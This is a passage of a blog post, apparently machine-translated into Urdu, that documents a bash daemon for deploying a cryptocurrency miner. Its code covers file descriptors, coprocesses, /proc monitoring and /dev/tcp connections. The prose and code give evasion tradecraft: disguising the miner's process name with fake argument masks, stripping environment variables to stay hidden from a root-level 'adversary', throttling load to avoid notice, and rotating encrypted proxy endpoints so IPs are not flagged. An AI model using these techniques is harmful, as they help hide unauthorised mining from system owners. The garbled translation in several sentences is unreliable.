    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>کا استعمال کرتے ہیں<code>RANDOM</code> کریکٹر کوڈ کے مطابق 97-122 کے درمیان نمبر حاصل کرنے کے لیے متغیر ، printf ایک بلٹ ان ہونا چاہیے ، ہم کسی لوپ کے اندر کانٹا نہیں بنانا چاہتے۔<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>گمنام فائل ڈسریکٹر بنانے کے لیے پائپوں کا فائدہ اٹھائیں ، یہ بالکل فائل ڈسریکٹر کی طرح برتاؤ نہیں کرتے لیکن وہ اس کے لیے کافی اچھے ہیں<a href=https://en.wikipedia.org/wiki/Inter-process_communication> آئی پی سی</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>بغیر کانٹے کے سو جانا ، ریڈ بلٹین کی ٹائم آؤٹ فعالیت کو غلط استعمال کرتے ہوئے ، یہ ایک سرشار فائل ڈسکریپٹر کا استعمال کرتا ہے اور ہمیں یہ یقینی بنانا چاہیے کہ یہ ختم ہونے سے بچنے کے لیے دستیاب ہے۔<p>جیسے افعال ہیں۔<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> سسٹم کے استعمال کی نگرانی کے لیے استعمال ہوتے ہیں ، یہ سب لینکس کا استعمال کرتے ہیں۔<code>/proc</code> جیسے ٹولز کے بغیر فائلیں۔<code>ps</code> ، تو کوئی فورکنگ نہیں ، تمام خالص بش۔<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>بش کے بعد سے کوپروسیس دستیاب ہیں۔<code>v4</code> ، وہ نوکریوں کی طرح ہیں سوائے ان کے کہ ان کا نام اور ان کے اپنے فائل ڈسریکٹر ہیں۔<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>ہم ایک ڈیمون لکھ رہے ہیں ، جو کہ ایک طویل عرصہ تک جاری رہنے والا عمل ہے ، اور ہم بہت سے فائل ڈسریکٹر استعمال کر رہے ہیں ، ہم واقعتا some کچھ صفائی کرنا چاہتے ہیں تاکہ اس سے بچا جا سکے<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> حدود</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>یہ فنکشن انحصار کرتا ہے۔<a href=https://ipinfo.io/> ipinfo</a> کارکن کے علاقے کا تعین کرنے کے لیے ، جو کہ کچھ علاقے پر منحصر منطق کو ٹیون کرنے کی اجازت دیتا ہے ،<a href=\assets/posts/geoip.json> geoip.json</a> ممالک کو خطوں میں تقسیم کرتے ہیں ، چونکہ ہم اعلیٰ سطح کا علاقہ چاہتے ہیں ، اور مخصوص ملک میں دلچسپی نہیں رکھتے۔<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>بش کو ٹی سی پی کنکشن کے لیے سپورٹ حاصل ہے<code>/dev/tcp</code> (یو ڈی پی کے لئے بھی ، لیکن زیادہ تر ایسا لگتا ہے کہ یہ عام طور پر تعمیر کے وقت غیر فعال ہوتا ہے ، لہذا آپ اس پر بھروسہ نہیں کرسکتے ہیں)۔ یہ فائلیں ایک باش چیز ہیں ، وہ لینکس کا حصہ نہیں ہیں۔<code>/dev</code> درخت<p>بش نوکریوں کے درمیان ہم آہنگی کو سنبھالنے کے لیے ایک لاکنگ سسٹم کا بھی ذکر کرنا ضروری ہے۔ متعدد ملازمتوں کو تالوں کے ساتھ کام کرنے کی اجازت دینے کے لیے ان سب کو فائل ڈسریکٹر کا اشتراک کرنے کی ضرورت ہے ، لہذا ہمارا۔<code>locker</code> جو کہ ایک نوکری بھی ہے ، لاک استعمال کرنے کی خواہش رکھنے والی دوسری ملازمتوں سے پہلے اسے شروع کرنا ہوگا۔ لاکر صرف پڑھتا ہے۔<code>stdin</code> لاکنگ کی درخواستوں کے جواب کا انتظار<code>stdout</code> ایک متغیر میں محفوظ موجودہ بولین ریاست پر منحصر ہے۔ میں اس بات کی ضمانت نہیں دیتا کہ یہ نقطہ نظر دوڑ سے پاک ہے ، لیکن لگتا ہے کہ مہذب طریقے سے کام کرتا ہے ، دوسری طرف ، میں نے فائل ڈسریکٹر کو بہت قابل اعتماد نہیں پایا ہے ، کیونکہ مجھے شبہ ہے کہ کچھ بفر ایسے ہیں جو کہیں نیچے نہیں نکلتے<em> پائپ</em> اور بالآخر ڈیڈ لاک مارنا (جس کا مطلب ہے کہ آپ ہر وقت جواب دینے والے لاکر پر بھروسہ نہیں کر سکتے)۔<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>اپنے کوڑے دان کو صاف کریں ... پیچ کے پیچیدہ پروگرام بہت سے متغیرات کا استعمال کرتے ہوئے ختم ہوجاتے ہیں ، اور اگر آپ عالمی جگہ کا غلط استعمال کرتے ہیں تو یہ پھول جاتا ہے۔ اگر آپ شیل نوکریاں پھیلا رہے ہیں تو ، وہ تمام ماحول (جو مؤثر طریقے سے نقل کیا جاتا ہے ، شیئر نہیں کیا جاتا ہے) کے وارث بنتے ہیں ، آپ جلدی سے کھانے کے ساتھ ختم کر سکتے ہیں<code>100M</code> میموری ، اچھا نہیں. نیز ہم واقعی کم پروفائل بننا چاہتے ہیں۔ ہمارے تعیناتی کے منظر نامے میں ، مخالف۔<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> ممکنہ طور پر جڑ تک رسائی اور ہمارے عمل کے بارے میں مکمل معلومات حاصل کر سکتا ہے۔<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> ، اور آپ جانتے ہیں ... ہر عمل مکمل کمانڈ کے بارے میں معلومات رکھتا ہے جس نے اسے شروع کیا ، اور برآمد شدہ ماحول کے متغیرات۔<h2 id=configuration><a class=header-anchor href=#configuration> ترتیب</a></h2><p>ایک بار جب ہمارے پاس اپنا ماحول اور ہمارے اوزار ہیں ، ہمیں اپنے کان کن کو اس مشین کے لیے ٹیون کرنا ہوگا جس پر یہ چل رہی ہے ، سیڈو کوڈ میں کنفیگریشن مراحل:<ul><li><p>کان کن کے لیے عمل کا نام<li><p>میزبان معلومات (رام/کور/کیچز/<code>ENV_VARS</code>)<li><p>ترتیب ورژن<li><p><code>worker_id</code> کان کن کے لیے (آئی پی اور میزبان سے)<li><p>کنکشن کے لیے آئی پی/پورٹ۔</ul><p>عمل کے لیے نام کا انتخاب ضروری ہے۔<em> چھپائیں</em> حقیقت یہ ہے کہ ہم ایک کان کن چلا رہے ہیں ، لیکن ہم صرف اپنے بائنری کا نام تبدیل نہیں کر رہے ہیں ، ہمارے پاس ایک فہرست ہے۔<strong> ماسک</strong> ممکنہ امیدواروں کے لیے (ایک سادہ ٹیکسٹ فائل جہاں ہر لائن ماسک ہے):<ul><li><p>بے ترتیب سے ماسک چنیں<li><p>متنوع پروسیس کمانڈ حاصل کرنے کے لیے سٹرنگ کی دم کے عناصر کو شفل کریں (سب سے پہلے کو چھوڑ کر)۔ اب ہمارے پاس ایک سٹرنگ لگ رہی ہے۔<code>cmd --arg2 --arg1 --arg3</code> . یہ ہمارا مائنر ماسک ہے ، ہم بائنری چلاتے ہیں۔<em> بغیر</em> دلائل ، لیکن ایسا لگتا ہے کہ ہم نے ایک کمانڈ شروع کی ہے۔<code>cmd</code> دلائل کے ساتھ<code>--arg1 --arg2 --arg3</code> . فائل کے ناموں میں خالی جگہوں اور ڈیشوں کی اجازت ہے ، لہذا اس طرح کے بائنری کو چلانا ٹھیک ہے ، یہ عمل کے احکامات کو محفوظ کرتے وقت قابل عمل اور دلائل کے مابین لینکس فرق نہیں لگتا ہے۔<p>مائنر کنفیگریشن خود بخود سے بھری ہوئی ہے۔<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> حشرات</a></h3><p>، وقت کے ساتھ ، اپ اسٹریم کان کن بہت سے مل گئے۔<strong> خودکار ٹیوننگ</strong> خصوصیات ، لہذا اس نے میرے سکرپٹ کا حصہ بے کار بنا دیا ، لیکن یہاں اسٹریم اور ڈاون اسٹریم کے درمیان فرق یہ ہے کہ اپ اسٹریم کا مقصد زیادہ سے زیادہ کرنا ہے<em> کارکردگی</em> ، جبکہ ہمارا مقصد زیادہ سے زیادہ کرنا ہے۔<em> کارکردگی اور گڑبڑ</em> ، ہم نظام سے آگے نہیں بڑھنا چاہتے ، ہم خدمت میں خلل کے بغیر تھوڑا سا جوک کرنا چاہتے ہیں۔<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>اس کے لیے ہمیں ماحولیات کے بارے میں زیادہ سمجھدار تفہیم کی ضرورت ہے۔<code>l2/l3</code> پروسیسر ، رام ، اور کور ، اور موجودہ پروسیسر کی کیش ڈھانچہ۔<em> اوسط</em> لوڈ اور سی پی یو<em> استعمال</em>. میں نے ایک بنانے کی کوشش کی۔<a href=https://en.wikipedia.org/wiki/Finite-state_machine> ریاستی مشین</a> bash میں جو کہ کم سے کم سے شروع ہوگا اور مختلف ترتیبوں کو آہستہ آہستہ اوسط سے بہترین طریقے سے طے کرنے کی کوشش کرے گا۔ یہ ایک تھا۔<strong> بہت بڑا</strong> کوششوں کا ضیاع۔<a href=https://en.wikipedia.org/wiki/Technical_debt> تکنیکی قرض</a> جو کہ بہت جلد دیوالیہ ہو گیا اور زیادہ تر ضائع کر دیا گیا ، صرف کوڈ بیس میں باقیات باقی ہیں۔<p>اس تمام آٹو ٹیوننگ جمبو کو فریک کریں ، ہم نے میزبان کے استعمال/بوجھ کے لحاظ سے کان کنوں کی نیند پوری کی<code>sleep</code> دھاگوں کی پیداوار ، اور کنفیگریشن واچ ڈاگ میں کچھ اصلاحات کے درمیان۔<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> ، جو ہمیں رن ٹائم پر نیند کی مقدار کو دوبارہ لوڈ کرنے کی اجازت دیتا ہے۔ منطق بہت آسان ہے اور اس طرح نظر آتی ہے:<ul><li><p>اگر استعمال $ TARGET_USAGE سے اوپر/نیچے ہے (error غلطی کا مارجن) نیند میں اضافہ/کمی۔<li><p>اگر اوسط بوجھ اندر ہے۔<code>1m</code> $ TARGET_LOAD توقف/کان کنی دوبارہ شروع کرنے سے اوپر/نیچے ہے۔</ul><h3 id=connection><a class=header-anchor href=#connection> کنکشن</a></h3><p>ہمارے بش راؤنڈ اپ میں ہم نے کنکشن کے لیے افادیت دکھائی۔ ہمیں ان کی ضرورت کیوں ہے؟ کیونکہ ہمیں تنوع کی ضرورت ہے۔ کنفیگریشن میں اختتامی نقطہ کو مشکل سے کوڈ کرنا زیادہ دیر تک نہیں چلے گا ، جب کوئی چیز مشکوک نظر آتی ہے ، اور نیٹ ورک کی سرگرمی ہوتی ہے ، آئی پی کو پرچم لگایا جاتا ہے۔<p>شروع میں ہم نے کچھ طریقوں کے ساتھ تجربہ کیا:<ul><li><p>استعمال کرتے ہوئے<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> پراکسی چینز</a> مائنر نیٹ ورک کالز کو اوورلوڈ کرنے کے لیے ، لیکن اس میں کان کن کو ڈائنامک لائبریریوں کے ساتھ تعمیر کرنے کی ضرورت تھی ، اور آپ کو انہیں پے لوڈ کے ساتھ بھیجنا پڑا ، لہذا یہ ناقابل عمل تھا۔<li><p>چل رہا ہے a<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> آگے سرنگ</a> کان کن کے ساتھ شانہ بہ شانہ: اس میں بہت زیادہ کنفیگریشن اوور ہیڈ تھی ، جیسا کہ اب ہم ہر تعیناتی پر دو عمل ترتیب دے رہے تھے ، جو کہ زیادہ کیڑے تھے۔</ul><p>آخر میں ہم نے اختتامی نکات کی ایک فہرست بھیجنے کے ساتھ طے کیا ، بش متغیر میں محفوظ ، بے ترتیب میں سے ایک کا انتخاب۔ رابطے یقینا خفیہ تھے۔ یہ آخری نکات کیا ہیں؟ پراکسی کو آگے بھیجنے والے جو کان کنوں کی ملازمتوں کو سنبھالیں گے۔<p>ہمیں ایک کی ضرورت کیوں ہے؟<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> کان کنی پراکسی</a> ؟ میں واقعی conc 100 سمورتی کنکشن سے پہلے کبھی نہیں گیا ، لہذا نیٹ ورک لوڈ کے لیے ایک پراکسی واقعی ضروری نہیں تھی ، لیکن یہ ہیشنگ الگورتھم پر بات چیت کرنے کے لیے آسان تھا ، اور مختلف کان کنوں کو مختلف مشکلات کے اہداف فراہم کرنے کے لیے ، کان کنوں کو کام کرنے سے روکنے کے لیے<strong> مشکل</strong> ایسے اہداف جو انہیں مکمل کرنے میں بہت زیادہ وقت لیں گے اور نامکمل ملازمتوں پر حساب ضائع کرنے کے خطرے سے بچیں گے۔<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> پول سوفٹ وئیر میں کچھ ترمیم کی بھی ضرورت تھی کیونکہ یہ خوشی سے اشتہار دے رہا تھا کہ سادہ http درخواستوں پر پراکسی ہو۔<em> جو ٹائم آؤٹ ہونا تھا۔</em> ، اور ایک کانٹے نے ایکسیس کنٹرول کو شامل کیا تاکہ ہم اس پر اپنے موڈز کی بنیاد رکھیں۔<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> json میں ترمیم</a></h3><p>json فائل میں صرف bash کے ساتھ ترمیم کا اطلاق ہم نے کچھ env var متبادل ، اور کچھ regex کے ساتھ کیا۔ شروع میں ہم ایک پر انحصار کر رہے تھے۔<code>envsubst</code> بائنری متغیرات کو لاگو کرنے کے لئے ، پھر ہم مکمل باز گئے۔<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> اس منطق کے ساتھ:<ul><li><p>تشکیل کا سانچہ پڑھیں۔<li><p>تمام حوالوں کو انتہائی باطنی تار سے تبدیل کریں (جیسے۔<code>_#_#</code>)<li><p><code>eval</code> سانچہ<li><p>تمام باطنی واقعات کو اقتباسات سے تبدیل کریں۔</ul><p>ذیلی عمل سے بچنے کے علاوہ ، ایک اور فائدہ یہ ہے کہ ہم اپنے ٹیمپلیٹس میں مکمل بش صلاحیتیں حاصل کرتے ہیں۔ بغیر ٹیمپلیٹس کے پڑھنے اور لکھنے کے لیے ، ہمیں bash regex صلاحیتوں پر انحصار کرنا ہوگا۔<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
